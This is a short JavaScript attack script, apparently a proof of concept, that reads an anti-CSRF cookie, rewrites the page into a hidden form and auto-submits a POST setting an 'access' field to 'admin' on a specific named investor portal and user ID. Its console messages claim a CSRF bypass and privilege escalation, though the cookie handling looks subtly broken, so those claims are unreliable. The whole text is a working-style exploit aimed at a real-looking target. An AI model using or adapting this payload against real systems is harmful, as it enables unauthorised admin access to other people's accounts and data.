//BEGIN
console.log("Reading XSRF-TOKEN value...");
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
console.log("XSRF-Token read successfully!");
console.log("extracting the token..");
var extract = readCookie('xsrf');
document.cookie = "XSRF-TOKEN" + extract;
console.log("extracted and written to DOM document.cookie =" + document.cookie);
console.log("bypassing anti-CSRF mechanism to attain privillege escalation");
history.pushState('', '', '/');
document.body.innerHTML='<html><body style="background-color:black;"><form id="privesc" action="https://investorportal.ispt.net.au/user/updateField/1559" method="POST" enctype="multipart/form-data"><input type="hidden" name="access" value="admin" /><input type="submit" value="Submit request" /></form></body></html>';
document.getElementById('privesc').submit();
console.log("Bypassed.. you now have admin access");
alert(document.cookie);
//EOF
